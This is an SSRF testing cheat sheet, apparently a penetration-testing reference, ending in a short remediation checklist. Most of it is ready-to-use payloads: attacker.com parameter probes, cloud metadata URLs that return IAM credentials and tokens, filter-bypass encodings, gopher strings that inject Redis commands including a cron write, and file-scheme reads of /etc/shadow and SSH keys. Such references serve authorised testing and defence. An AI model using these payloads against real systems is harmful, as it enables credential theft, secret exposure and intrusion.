# Server-Side Request Forgery (SSRF)

Server-Side Request Forgery is a vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain, internal service, or cloud metadata endpoint chosen by the attacker.

## Basic SSRF Testing

Identify endpoints that accept URLs or fetch remote resources:

```
# Common vulnerable parameters
url=http://attacker.com
file=http://attacker.com
page=http://attacker.com
load=http://attacker.com
resource=http://attacker.com
callback=http://attacker.com
redirect=http://attacker.com
imageurl=http://attacker.com
feed=http://attacker.com
```

Confirm SSRF by supplying a URL pointing to a collaborator/webhook:

```
POST /fetch HTTP/1.1
Content-Type: application/json

{"url": "http://your-collaborator.burpcollaborator.net"}
```

## Internal Network Scanning

```
# Common internal targets
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1

# Port scanning via SSRF
http://127.0.0.1:22    -- SSH
http://127.0.0.1:6379  -- Redis
http://127.0.0.1:27017 -- MongoDB
http://127.0.0.1:9200  -- Elasticsearch
http://127.0.0.1:8500  -- Consul
http://127.0.0.1:2379  -- etcd
http://127.0.0.1:5985  -- WinRM
```

## Cloud Metadata Endpoints

### AWS (IMDSv1)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

### AWS (IMDSv2 — requires token)

```bash
# Step 1: Get token (requires PUT with header)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

### GCP

```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/hostname
# Requires header: Metadata-Flavor: Google
```

### Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Requires header: Metadata: true
```

### DigitalOcean

```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
```

## IP Address Encoding Tricks

```
# Decimal encoding (127.0.0.1)
http://2130706433

# Hex encoding
http://0x7f000001
http://0x7f.0x0.0x0.0x1

# Octal encoding
http://0177.0.0.01
http://0177.0000.0000.0001

# Mixed encoding
http://0x7f.0.0.1
http://127.0.0x0.1

# IPv6 representations
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:7f00:0001]

# Shorthand for 127.0.0.1
http://0
http://127.1
http://127.0.1
```

## DNS Rebinding

Use a DNS server that alternates between attacker IP and internal IP:

1. Victim server resolves `attacker-domain.com` to attacker's IP (passes allowlist check)
2. On second resolution (during fetch), DNS returns `127.0.0.1`
3. Server fetches from internal address

Tools: `rbndr.us`, `1u.ms`, custom DNS server

```
# Using rbndr.us
http://7f000001.c0a80001.rbndr.us  -- alternates between 127.0.0.1 and 192.168.0.1
```

## Protocol Smuggling

### Gopher Protocol

```
# Redis command injection via gopher
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0akey%0d%0a$5%0d%0avalue%0d%0a

# Write cron job via Redis
gopher://127.0.0.1:6379/_*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a

# SMTP via gopher
gopher://127.0.0.1:25/_HELO%20localhost%0d%0aMAIL%20FROM:<attacker@evil.com>%0d%0aRCPT%20TO:<victim@target.com>%0d%0aDATA%0d%0aSubject:%20Test%0d%0a%0d%0aBody%0d%0a.%0d%0aQUIT
```

### File Protocol

```
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
file:///home/user/.ssh/id_rsa
file:///var/www/html/config.php
```

### Dict Protocol

```
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:11211/stats   -- Memcached
```

## Filter Bypass Techniques

```
# URL shorteners and redirects
https://tinyurl.com/your-internal-redirect
http://attacker.com/redirect?url=http://169.254.169.254/

# URL encoding
http://%31%32%37%2e%30%2e%30%2e%31

# Register domain that resolves to 127.0.0.1
http://localtest.me          -- resolves to 127.0.0.1
http://spoofed.burpcollaborator.net

# Bypass using @ in URL
http://allowed-domain@127.0.0.1
http://127.0.0.1#@allowed-domain

# Bypass using backslash
http://allowed-domain\@127.0.0.1

# CRLF in URL to inject headers
http://127.0.0.1%0d%0aX-Injected:%20header

# Unicode normalization bypass
http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ
```

## Blind SSRF Detection

When responses are not returned to the attacker:

1. **Out-of-band detection**: Use Burp Collaborator, interactsh, or webhook.site
2. **Timing-based**: Measure response time differences for open vs closed ports
3. **Error-based**: Observe different error messages for reachable vs unreachable hosts
4. **Partial response**: Status codes or content-length differences

## Remediation Checks

- Allowlist approach for permitted domains and IP ranges
- Block requests to private/reserved IP ranges (RFC 1918, link-local)
- Disable unnecessary URL schemes (gopher, file, dict, ftp)
- Enforce IMDSv2 for AWS instances
- Use network-level segmentation to limit server egress
- Validate and sanitize URL input on the server side
